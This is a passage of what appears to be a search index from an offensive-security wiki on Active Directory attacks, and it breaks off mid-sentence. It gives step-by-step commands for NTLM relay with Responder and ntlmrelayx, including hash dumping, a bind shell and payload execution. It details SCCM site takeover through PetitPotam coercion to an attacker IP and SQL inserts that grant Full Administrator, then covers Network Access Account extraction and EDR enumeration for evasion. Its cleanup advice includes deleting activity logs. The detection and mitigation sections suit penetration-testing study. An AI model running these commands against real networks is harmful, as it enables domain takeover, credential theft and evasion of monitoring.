</ul>","tags":["#type/technique","#stage/initial-access","#protocol/llmnr","#protocol/netbios","#protocol/smb","#tactic/TA0001","#os/windows","#tool/responder","#tool/ntlmrelayx","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/relay_attacks/#execution","title":"Execution","text":"","tags":["#type/technique","#stage/initial-access","#protocol/llmnr","#protocol/netbios","#protocol/smb","#tactic/TA0001","#os/windows","#tool/responder","#tool/ntlmrelayx","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/relay_attacks/#identifying-relay-targets","title":"Identifying Relay Targets","text":"","tags":["#type/technique","#stage/initial-access","#protocol/llmnr","#protocol/netbios","#protocol/smb","#tactic/TA0001","#os/windows","#tool/responder","#tool/ntlmrelayx","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/relay_attacks/#automated-tools","title":"Automated Tools","text":"<p>RunFinger.py included with Responder can scan the network for potential relay targets for:</p> <ul> <li>SMB</li> <li>MSSQL</li> <li>RDP</li> </ul> <pre><code>python3 RunFinger.py -i 192.168.1.0/24\n</code></pre> <p>NetExec will automatically generate a list of targets with --gen-relay-list for SMB:</p> <pre><code>nxc smb 192.168.1.0/24 --gen-relay-list output.txt\n</code></pre>","tags":["#type/technique","#stage/initial-access","#protocol/llmnr","#protocol/netbios","#protocol/smb","#tactic/TA0001","#os/windows","#tool/responder","#tool/ntlmrelayx","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/relay_attacks/#setting-up-a-relay-attack","title":"Setting Up a Relay Attack","text":"","tags":["#type/technique","#stage/initial-access","#protocol/llmnr","#protocol/netbios","#protocol/smb","#tactic/TA0001","#os/windows","#tool/responder","#tool/ntlmrelayx","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/relay_attacks/#responder-ntlmrelayx","title":"Responder + ntlmrelayx","text":"<ol> <li> <p>Edit Responder configuration to disable SMB and HTTP servers: <pre><code>sudo nano /etc/responder/Responder.conf\n# Change:\nSMB = On --&gt; Off\nHTTP = On --&gt; Off\n</code></pre></p> </li> <li> <p>Create a targets list: <pre><code>echo \"&lt;TargetIP&gt;\" &gt; targets.txt\n</code></pre></p> </li> <li> <p>Run Responder: <pre><code>sudo responder -I eth0 -wv\n</code></pre></p> </li> <li> <p>Start ntlmrelayx with any of these options:</p> </li> </ol> <p>Dump hashes: <pre><code>sudo impacket-ntlmrelayx -tf targets.txt -smb2support\n</code></pre></p> <p>Get semi-interactive smbexec bind shell (connect with <code>nc localhost 11000</code>): <pre><code>sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i\n</code></pre></p> <p>Execute payload: <pre><code>sudo impacket-ntlmrelayx -tf targets.txt -smb2support -e payload.exe\n</code></pre></p> <p>Execute Command: <pre><code>sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'\n</code></pre></p> <ol> <li>Wait for authentication attempts or coerce authentication attempts from target users.</li> </ol>","tags":["#type/technique","#stage/initial-access","#protocol/llmnr","#protocol/netbios","#protocol/smb","#tactic/TA0001","#os/windows","#tool/responder","#tool/ntlmrelayx","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/relay_attacks/#cleanup-considerations","title":"Cleanup Considerations","text":"<ul> <li>Stop Responder and ntlmrelayx when finished</li> <li>Remove any created files or payloads on target systems</li> </ul>","tags":["#type/technique","#stage/initial-access","#protocol/llmnr","#protocol/netbios","#protocol/smb","#tactic/TA0001","#os/windows","#tool/responder","#tool/ntlmrelayx","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/relay_attacks/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#stage/initial-access","#protocol/llmnr","#protocol/netbios","#protocol/smb","#tactic/TA0001","#os/windows","#tool/responder","#tool/ntlmrelayx","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/relay_attacks/#detection","title":"Detection","text":"<ul> <li>Monitor for multiple failed authentication attempts from unexpected sources</li> <li>Watch for authentication events where the source IP doesn't match expected client locations</li> <li>Look for unusual SMB traffic patterns across the network</li> </ul>","tags":["#type/technique","#stage/initial-access","#protocol/llmnr","#protocol/netbios","#protocol/smb","#tactic/TA0001","#os/windows","#tool/responder","#tool/ntlmrelayx","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/relay_attacks/#mitigation","title":"Mitigation","text":"<ul> <li>Enable SMB signing on all systems (ideally, require it rather than just enabling it)</li> <li>Implement LDAP signing and channel binding</li> <li>Use Credential Guard in Windows to prevent NTLM credential theft</li> <li>Disable NTLM authentication where possible in favor of Kerberos</li> <li>Segment networks to limit the scope of potential relay attacks</li> </ul>","tags":["#type/technique","#stage/initial-access","#protocol/llmnr","#protocol/netbios","#protocol/smb","#tactic/TA0001","#os/windows","#tool/responder","#tool/ntlmrelayx","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/sccm_site_takeover/","title":"Sccm site takeover","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1210","#stage/privilege-escalation","#os/windows","#service/sccm","#tool/msfconsole"]},{"location":"Active%20Directory/flat/sccm_site_takeover/#technique","title":"Technique","text":"<p>GitHub - misonfiguration-manager</p> <p>SCCM Site Takeover refers to a collection of attack techniques that target Microsoft System Center Configuration Manager (SCCM/MECM) environments to gain full administrative privileges. With these privileges, an attacker can execute arbitrary code as SYSTEM on any managed device in the environment (often thousands of systems). Several takeover methods exist:</p> <ol> <li> <p>TAKEOVER-1: NTLM Relay to MSSQL: Exploits environments where the SCCM database is on a separate server from the Primary Site Server. By coercing authentication from site components and relaying to MSSQL, attackers can directly modify security tables.</p> </li> <li> <p>TAKEOVER-2: NTLM Relay to SMB: Similar to the first method, but relays to SMB on the database server to gain local admin access to the filesystem and database.</p> </li> <li> <p>TAKEOVER-3: NTLM Relay to AD CS: Coerces authentication from SCCM components and relays to AD Certificate Services to obtain certificates for impersonation.</p> </li> <li> <p>TAKEOVER-4: CAS to Primary Site Relay: Exploits communication between Central Administration Site and Primary Site Servers.</p> </li> <li> <p>TAKEOVER-5: Relay to AdminService: Targets the RESTful AdminService API on the SMS Provider.</p> </li> <li> <p>TAKEOVER-6: Relay to SMS Provider SMB: Coerces authentication and relays to the SMS Provider via SMB.</p> </li> <li> <p>TAKEOVER-7: High Availability Component Relay: Exploits communication between primary and passive site servers in HA deployments.</p> </li> <li> <p>TAKEOVER-8: Relay to LDAP: Coerces authentication from SCCM components and relays to domain controllers.</p> </li> <li> <p>TAKEOVER-9: Database Link Crawling: Exploits database links configured with excessive privileges.</p> </li> <li> <p>Network Access Account (NAA) Abuse: Extracts credentials of the Network Access Account used for OS deployment, which often has extensive permissions.</p> </li> </ol> <p>Each technique aims to add an attacker-controlled account to the \"Full Administrator\" role, granting complete control over the environment.</p>","tags":["#type/technique","#tactic/TA0004","#technique/T1210","#stage/privilege-escalation","#os/windows","#service/sccm","#tool/msfconsole"]},{"location":"Active%20Directory/flat/sccm_site_takeover/#prerequisites","title":"Prerequisites","text":"<p>Access Level: - Low-privilege domain account for initial enumeration and coercion - For Takeover Method 2: Local administrator access on at least one SCCM-managed endpoint</p> <p>System State Requirements: - For NTLM Relay Method:   - SCCM deployment with separate Primary Site Server and MSSQL database server   - Primary Site Server's machine account has local admin rights on the database server   - SMB signing not enforced on the database server   - MSSQL service accessible and not using Extended Protection for Authentication (EPA)   - Coercion vulnerabilities available on the Primary Site Server</p> <ul> <li>For NAA Abuse Method:</li> <li>Network Access Account configured with excessive permissions</li> <li>PXE boot or OS deployment functionality enabled</li> </ul> <p>Tools Required: - Enumeration: SharpSCCM, sccmhunter - NTLM Relay: Impacket's ntlmrelayx.py - Authentication Coercion: PetitPotam, Coercer - SQL Access: Impacket's mssqlclient.py</p>","tags":["#type/technique","#tactic/TA0004","#technique/T1210","#stage/privilege-escalation","#os/windows","#service/sccm","#tool/msfconsole"]},{"location":"Active%20Directory/flat/sccm_site_takeover/#considerations","title":"Considerations","text":"<p>Impact</p> <p>A successful SCCM site takeover provides: - Complete control over all managed endpoints (often thousands of systems) - Ability to execute arbitrary code as SYSTEM across the enterprise - Deployment of malicious applications under the guise of legitimate software updates - Access to sensitive resources used during OS deployment - Potential for long-term persistence via custom client settings and policies</p> <p>OPSEC</p> <ul> <li>Authentication Coercion: Tools like PetitPotam generate logs that might be monitored</li> <li>NTLM Relay: Machine accounts authenticating from unexpected sources is suspicious</li> <li>Database Modifications: Direct modifications to RBAC tables may trigger alerts if database auditing is enabled</li> <li>Console Actions: After gaining SCCM admin access, all actions in the console are logged and attributable to the compromised account</li> <li>Client Deployments: Deploying applications or scripts to all systems simultaneously is highly visible</li> </ul>","tags":["#type/technique","#tactic/TA0004","#technique/T1210","#stage/privilege-escalation","#os/windows","#service/sccm","#tool/msfconsole"]},{"location":"Active%20Directory/flat/sccm_site_takeover/#enumeration","title":"Enumeration","text":"<p>sccmhunter.py (Linux)</p> <pre><code># Discover SCCM infrastructure\npython3 sccmhunter.py find -u &lt;user&gt; -p &lt;pass&gt; -d &lt;domain&gt; -dc-ip &lt;dc-ip&gt;\n\n# Display all discovered information\npython3 sccmhunter.py show -all\n\n# Profile SMB shares and configurations\npython3 sccmhunter.py smb -u &lt;user&gt; -p &lt;pass&gt; -d &lt;domain&gt; -dc-ip &lt;dc-ip&gt; -save\n\n# Prepare SQL commands for admin access (useful for TAKEOVER-1)\npython3 sccmhunter.py mssql -dc-ip &lt;dc-ip&gt; -d &lt;domain&gt; -u &lt;user&gt; -p &lt;pass&gt; -tu &lt;target_user&gt; -sc &lt;site_code&gt; -stacked\n</code></pre> <p>SharpSCCM (Windows)</p> <pre><code># Get site information\nSharpSCCM.exe get site-info\n\n# Get SID of current user for use in takeover\nSharpSCCM.exe local user-sid\n\n# List site users\nSharpSCCM.exe get users\n</code></pre>","tags":["#type/technique","#tactic/TA0004","#technique/T1210","#stage/privilege-escalation","#os/windows","#service/sccm","#tool/msfconsole"]},{"location":"Active%20Directory/flat/sccm_site_takeover/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1210","#stage/privilege-escalation","#os/windows","#service/sccm","#tool/msfconsole"]},{"location":"Active%20Directory/flat/sccm_site_takeover/#method-1-ntlm-relay-to-sql-server","title":"Method 1: NTLM Relay to SQL Server","text":"<p>Step 1: Set up NTLM Relay</p> <p>Start ntlmrelayx to listen for incoming connections and relay to the MSSQL server:</p> <pre><code>impacket-ntlmrelayx -t \"mssql://&lt;MSSQL_SERVER_IP&gt;\" -smb2support -socks\n</code></pre> <p>OR directly from ntlmrelayx (can work if proxy is giving issues)</p> <p><pre><code>impacket-ntlmrelayx -t \"mssql://&lt;MSSQL_SERVER_IP&gt;\" -smb2support -i\n</code></pre> (Then netcat into bind)</p> <p>Step 2: Coerce Authentication from the Primary Site Server</p> <p>Using PetitPotam: <pre><code>python3 PetitPotam.py -u &lt;user&gt; -p '&lt;password&gt;' -d &lt;domain&gt; &lt;ATTACKER_IP&gt; &lt;PRIMARY_SITE_SERVER_IP&gt;\n</code></pre></p> <p>Alternatively, using Coercer to try multiple methods: <pre><code>python3 coercer.py coerce -l &lt;attackerIP&gt; -t &lt;targetIP&gt; -u 'user' -p 'pass' -d &lt;domain.local&gt; -v\n</code></pre></p> <p>Step 3: Access the Database via Relayed Session</p> <p>Connect to the database using the relayed credentials through the SOCKS proxy: <pre><code>proxychains4 -q python3 mssqlclient.py 'DOMAIN/PRIMARY_SITE_SERVER_NAME$'@&lt;MSSQL_SERVER_IP&gt; -windows-auth -no-pass\n</code></pre></p> <p>Step 4: Add Your Account as SCCM Full Administrator</p> <p>First, get your SID in PowerShell: <pre><code>Get-DomainUser &lt;User&gt; -Properties objectsid\n</code></pre></p> <p>Convert SID to binary format (PowerShell): <pre><code>function Convert-StringSidToBinary {\n    param ([string]$StringSid)\n    $sid = New-Object System.Security.Principal.SecurityIdentifier $StringSid\n    $binarySid = New-Object byte[] ($sid.BinaryLength)\n    $sid.GetBinaryForm($binarySid, 0)\n    $binarySidHex = ($binarySid | ForEach-Object { $_.ToString(\"X2\") }) -join ''\n    echo \"0x$($binarySidHex.ToLower())\"\n}\n\nConvert-StringSidToBinary \"&lt;SID&gt;\"\n</code></pre></p> <p>In the SQL connection, execute these queries to add yourself as admin: <pre><code>USE CM_&lt;SiteCode&gt;;\nINSERT INTO RBAC_Admins (AdminSID, LogonName, IsGroup, IsDeleted, SourceSite) VALUES (&lt;hex_of_converted_sid&gt;, 'DOMAIN\\User', 0, 0, '&lt;SiteCode&gt;');\n\n-- Get your new AdminID\nSELECT AdminID, LogonName FROM RBAC_Admins;\n\n-- Add Full Administrator permissions (use your AdminID from above)\nINSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) VALUES (&lt;new_admin_id&gt;, 'SMS0001R', 'SMS00ALL', '29');\nINSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) VALUES (&lt;new_admin_id&gt;, 'SMS0001R', 'SMS00001', '1');\nINSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) VALUES (&lt;new_admin_id&gt;, 'SMS0001R', 'SMS00004', '1');\n</code></pre></p> <p>or execute directly in relay:</p> <pre><code>impacket-ntlmrelayx -t \"mssql://&lt;SITE_DB_IP&gt;\" -smb2support -ts -q \"USE CM_&lt;SiteCode&gt;; INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,SourceSite) VALUES (0x[HEX_SID],'DOMAIN\\\\User',0,0,'&lt;SiteCode&gt;');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'DOMAIN\\\\User'),'SMS0001R','SMS00ALL','29');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'DOMAIN\\\\User'),'SMS0001R','SMS00001','1');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'DOMAIN\\\\User'),'SMS0001R','SMS00004','1');\"\n</code></pre> <p>Step 5: Login to SCCM Console</p> <p>You can now login to the SCCM console with your account and have full administrative access. From here you can: - Deploy applications to any/all systems - Create custom scripts to run as SYSTEM - Access sensitive resources - Create persistence mechanisms</p>","tags":["#type/technique","#tactic/TA0004","#technique/T1210","#stage/privilege-escalation","#os/windows","#service/sccm","#tool/msfconsole"]},{"location":"Active%20Directory/flat/sccm_site_takeover/#method-2-network-access-account-naa-abuse","title":"Method 2: Network Access Account (NAA) Abuse","text":"<p>This method involves extracting and using the Network Access Account, which often has extensive permissions in the domain.</p> <p>Step 1: Identify NAA credentials on a managed endpoint</p> <p>On a system where you have administrative access: <pre><code># Check if you can access the PolicyProvider.log\nGet-Content \"C:\\Windows\\CCM\\Logs\\PolicyProvider.log\" | Select-String \"NAA\"\n\n# Extract Network Access Account from WMI\n$Namespace = \"ROOT\\ccm\\policy\\Machine\\ActualConfig\"\n$Class = \"CCM_NetworkAccessAccount\"\n$NAA = Get-WmiObject -Namespace $Namespace -Class $Class\n$NAA\n</code></pre></p> <p>Step 2: Decrypt the credentials</p> <p>The credentials are encrypted but can often be extracted using tools like Mimikatz or other SCCM-specific tooling.</p> <p>Step 3: Use the NAA credentials for lateral movement</p> <p>The NAA often has significant permissions across the domain. Test access to resources: <pre><code>Invoke-Command -ComputerName &lt;target&gt; -ScriptBlock {whoami} -Credential $credential\n</code></pre></p>","tags":["#type/technique","#tactic/TA0004","#technique/T1210","#stage/privilege-escalation","#os/windows","#service/sccm","#tool/msfconsole"]},{"location":"Active%20Directory/flat/sccm_site_takeover/#cleanup-considerations","title":"Cleanup Considerations","text":"<ul> <li>Remove your account from the SCCM administrators in the database</li> <li>Delete any applications, packages, or task sequences you created</li> <li>Remove any scripts or collections created during testing</li> <li>Delete logs of your activities if possible</li> </ul>","tags":["#type/technique","#tactic/TA0004","#technique/T1210","#stage/privilege-escalation","#os/windows","#service/sccm","#tool/msfconsole"]},{"location":"Active%20Directory/flat/sccm_site_takeover/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1210","#stage/privilege-escalation","#os/windows","#service/sccm","#tool/msfconsole"]},{"location":"Active%20Directory/flat/sccm_site_takeover/#detection","title":"Detection","text":"<p>For NTLM Relay Attack: - Monitor for authentication coercion attempts (e.g., EFS RPC calls from PetitPotam) - Alert on machine accounts authenticating from unexpected IP addresses - Implement database auditing to detect direct modifications to RBAC_* tables - Monitor Event ID 4624 (successful logon) for SCCM machine accounts from unusual sources - Watch for unexpected new administrators in the SCCM console</p> <p>For NAA Abuse: - Monitor for unusual access patterns using the Network Access Account - Watch for credential extraction attempts on managed endpoints - Monitor SCCM client logs for unauthorized access attempts</p>","tags":["#type/technique","#tactic/TA0004","#technique/T1210","#stage/privilege-escalation","#os/windows","#service/sccm","#tool/msfconsole"]},{"location":"Active%20Directory/flat/sccm_site_takeover/#mitigation","title":"Mitigation","text":"<p>For NTLM Relay Attack: - Enable Extended Protection for Authentication (EPA) on the MSSQL service - Require SMB Signing on all servers, especially SCCM infrastructure - Co-locate the SCCM database on the Primary Site Server when possible - Apply security updates that address NTLM relay and coercion vulnerabilities - Use Privileged Access Workstations (PAWs) for SCCM administration</p> <p>For NAA Abuse: - Implement least privilege for the Network Access Account - Consider using Group Managed Service Accounts (gMSAs) instead of regular domain accounts - Regularly rotate NAA credentials - Segment SCCM infrastructure on its own network - Implement Just-In-Time administration for SCCM console access - Use certificate-based authentication for client access when possible</p>","tags":["#type/technique","#tactic/TA0004","#technique/T1210","#stage/privilege-escalation","#os/windows","#service/sccm","#tool/msfconsole"]},{"location":"Active%20Directory/flat/security_controls_enumeration/","title":"Security controls enumeration","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#technique","title":"Technique","text":"<p>Security Controls Enumeration involves identifying and analyzing security products, configurations, and defensive measures on a target system. This intelligence gathering is crucial for both attackers (to evade detection) and defenders (to validate security posture).</p> <p>Effective enumeration reveals: - Security products installed (antivirus, EDR, etc.) - Security configurations (AppLocker, AMSI, PowerShell restrictions) - Audit policies and logging configurations - Firewall rules and network security settings - Patch levels and vulnerable components</p> <p>A key approach is \"Living Off The Land\" (LOL) - using built-in system utilities and administration tools rather than custom tools to avoid detection. These native binaries and scripts are legitimate and trusted by the operating system, making their activities less likely to trigger alerts.</p>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#prerequisites","title":"Prerequisites","text":"<p>Access Level: At minimum, standard user access to the target system. Higher privileges will reveal more comprehensive information.</p> <p>System State: The target system should be in a normal operating state with standard system utilities available.</p> <p>Information Required: - Basic understanding of the target operating system (Windows/Linux) - Knowledge of common system administration commands - Awareness of security product indicators</p>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#living-off-the-land-techniques-windows","title":"Living Off The Land Techniques (Windows)","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#os-context-basic-information","title":"OS Context &amp; Basic Information","text":"<pre><code># Get hostname\nhostnamei\n\n# Get OS version\nwmic os get Caption,Version,BuildNumber,OSArchitecture\n[System.Environment]::OSVersion.Version\n\n# Get patches and hotfixes\nwmic qfe get Caption,Description,HotFixID,InstalledOn\n\n# Get network configuration\nipconfig /all\n\n# Get environment variables\nset\n\n# Display domain information\necho %USERDOMAIN%\necho %logonserver%\n\n# Comprehensive system information\nsysteminfo\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#security-product-enumeration","title":"Security Product Enumeration","text":"<pre><code># Check Windows Defender status\nsc query windefend\nGet-MpComputerStatus\n\n# Check firewall status\nnetsh advfirewall show allprofiles\n\n# List installed security updates\nwmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /i \"security KB\"\n\n# Check antivirus products (WMI query)\nwmic /namespace:\\\\root\\securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe\n\n# Check running security services\nsc query type= service | findstr /i \"defender security antivirus firewall protection\"\n\n# Check scheduled tasks related to security\nschtasks /query /fo LIST /v | findstr /i \"defender security antivirus firewall protection\"\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#powershell-security-settings","title":"PowerShell Security Settings","text":"<pre><code># Check PowerShell version\n$PSVersionTable\n\n# Check PowerShell execution policy\nGet-ExecutionPolicy -List\n\n# Check PowerShell language mode (restrictions)\n$ExecutionContext.SessionState.LanguageMode\n\n# Check PowerShell modules available\nGet-Module -ListAvailable\n\n# Check PowerShell script block logging\nReg Query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\"\n\n# Check PowerShell transcription\nReg Query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\"\n\n# Check AMSI (Anti-Malware Scan Interface) status\nReg Query \"HKLM\\SOFTWARE\\Microsoft\\Windows Script Host\\Settings\" /v \"Enabled\"\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#powerview-remote-enumeration-techniques","title":"PowerView Remote Enumeration Techniques","text":"<p>PowerView </p> <pre><code># Import PowerView\nImport-Module .\\PowerView.ps1\n\n# If running as a different user (for authentication to remote systems)\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('domain\\user', $SecPassword)\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#remote-process-enumeration","title":"Remote Process Enumeration","text":"<pre><code># Enumerate processes on a remote system using PowerView\nGet-NetProcess -ComputerName \"target-computer\"\n\n# With alternate credentials\nGet-NetProcess -ComputerName \"target-computer\" -Credential $Cred\n\n# Filter for security product processes\nGet-NetProcess -ComputerName \"target-computer\" | \n    Where-Object { $_.ProcessName -match \"defender|crowdstrike|sentinel|cylance|carbonblack|mcafee|symantec|kaspersky|sophos\" }\n\n# Using WMI for process enumeration with command line details\nGet-WmiObject -Class Win32_Process -ComputerName \"target-computer\" | \n    Where-Object { $_.Name -match \"defender|crowdstrike|sentinel|cylance\" } | \n    Select-Object Name, ProcessId, CommandLine\n\n# Enumerate processes across multiple computers\n$computers = Get-DomainComputer | Select-Object -ExpandProperty dnshostname\nforeach ($computer in $computers) {\n    Write-Host \"===== $computer =====\"\n    try {\n        Get-NetProcess -ComputerName $computer -ErrorAction Stop | \n            Where-Object { $_.ProcessName -match \"defender|security|protect\" }\n    } catch {\n        Write-Host \"Unable to query $computer\"\n    }\n}\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#remote-service-enumeration","title":"Remote Service Enumeration","text":"<pre><code># Enumerate services on a remote system using PowerView\nGet-NetService -ComputerName \"target-computer\"\n\n# With alternate credentials\nGet-NetService -ComputerName \"target-computer\" -Credential $Cred\n\n# Filter for security services\nGet-NetService -ComputerName \"target-computer\" | \n    Where-Object { $_.ServiceName -match \"defender|security|protect|antivirus|firewall\" }\n\n# Check for EDR services\nGet-NetService -ComputerName \"target-computer\" | \n    Where-Object { $_.ServiceName -match \"cb|crowd|sentinel|defender|cylance\" } | \n    Select-Object ServiceName, Path, StartMode, StartName\n\n# Using WMI for service enumeration\nGet-WmiObject -Class Win32_Service -ComputerName \"target-computer\" | \n    Where-Object { $_.DisplayName -match \"defend|secur|protect|antivirus|firewall|detect\" } | \n    Select-Object Name, DisplayName, State, PathName, StartName\n\n# Check for services with specific account context\nGet-WmiObject -Class Win32_Service -ComputerName \"target-computer\" | \n    Where-Object { $_.StartName -match \"LocalSystem\" } | \n    Select-Object Name, DisplayName, State, PathName, StartName\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#remote-registry-enumeration","title":"Remote Registry Enumeration","text":"<pre><code># Check remote Windows Defender status\nInvoke-Command -ComputerName \"target-computer\" -ScriptBlock {\n    Get-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableRealtimeMonitoring\" -ErrorAction SilentlyContinue\n}\n\n# Check remote PowerShell logging configuration\nInvoke-Command -ComputerName \"target-computer\" -ScriptBlock {\n    Get-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\" -Name \"EnableScriptBlockLogging\" -ErrorAction SilentlyContinue\n}\n\n# Check AppLocker configuration remotely\nInvoke-Command -ComputerName \"target-computer\" -ScriptBlock {\n    Get-ChildItem -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2\" -ErrorAction SilentlyContinue\n}\n\n# Using WMI for registry access\nInvoke-WmiMethod -Class StdRegProv -Name GetDWORD `\n    -ArgumentList @([UInt32]2147483650,\"SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\",\"DisableRealtimeMonitoring\") `\n    -ComputerName \"target-computer\"\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#remote-security-event-log-analysis","title":"Remote Security Event Log Analysis","text":"<pre><code># Check security event log size\nGet-WmiObject -Class Win32_NTEventLogFile -ComputerName \"target-computer\" | \n    Where-Object { $_.LogFileName -eq 'Security' } | \n    Select-Object LogFileName, FileSize, MaxFileSize\n\n# Extract failed login attempts remotely\nInvoke-Command -ComputerName \"target-computer\" -ScriptBlock {\n    Get-EventLog -LogName Security -InstanceId 4625 -Newest 10 | \n    Select-Object TimeGenerated, EntryType, Message\n}\n\n# Check for PowerShell script block logging events\nInvoke-Command -ComputerName \"target-computer\" -ScriptBlock {\n    Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} -MaxEvents 5\n}\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#remote-file-system-analysis","title":"Remote File System Analysis","text":"<pre><code># Check for security product installations\nInvoke-Command -ComputerName \"target-computer\" -ScriptBlock {\n    Get-ChildItem 'C:\\Program Files' -Include \"Defender\", \"CrowdStrike\", \"Carbon Black\", \"Cylance\", \"SentinelOne\" -Directory -ErrorAction SilentlyContinue\n    Get-ChildItem 'C:\\Program Files (x86)' -Include \"Defender\", \"CrowdStrike\", \"Carbon Black\", \"Cylance\", \"SentinelOne\" -Directory -ErrorAction SilentlyContinue\n}\n\n# Check for LAPS DLL (indicates LAPS is installed)\nInvoke-Command -ComputerName \"target-computer\" -ScriptBlock {\n    Test-Path 'C:\\Program Files\\LAPS\\CSE\\Admpwd.dll'\n}\n\n# Find security-related logs\nInvoke-Command -ComputerName \"target-computer\" -ScriptBlock {\n    Get-ChildItem 'C:\\Windows\\System32\\winevt\\Logs' -Include \"*security*\", \"*defender*\", \"*firewall*\", \"*powershell*\" -File\n}\n</code></pre>","tags":["#type/technique","#tactic/TA0007","#technique/T1082","#stage/reconnaissance","#os/windows","#tool/seatbelt","#tool/sharpup","#tool/lolbas","#tool/powerview","#stage/initial-access"]},{"location":"Active%20Directory/flat/security_controls_enumeration/#domain-policy-enumeration-with-powerview","title":"Domain Policy Enumeration with PowerView","text":"<pre><code># Get domain password policy\nGet-DomainPolicy\n\n# Get domain audit policy\nGet-DomainPolicy -PolicyType AuditPolicy\n\n# Get specific policy settings\n$domainPolicy = Get-DomainPolicy\n$domainPolicy.SystemAccess\n$domainPolicy.RegistryValues\n\n# Find users with interesting 